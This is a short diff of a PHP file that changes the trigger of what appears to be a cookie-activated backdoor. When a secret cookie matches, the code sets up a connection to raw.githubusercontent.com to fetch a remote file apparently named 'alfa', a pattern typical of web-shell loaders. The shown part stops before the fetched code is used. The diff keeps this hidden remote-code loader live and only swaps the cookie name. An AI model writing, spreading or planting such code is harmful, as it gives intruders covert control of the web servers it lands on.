@@ -1,6 +1,6 @@
 <?php
 
-if (isset($_COOKIE["anjing"]) && $_COOKIE["anjing"] == "anjing") {
+if (isset($_COOKIE["camel"]) && $_COOKIE["camel"] == "camel") {
     $host = "raw.githubusercontent.com";
     $port = 443;
     $path = "/mirebus66/lp/main/alfa";
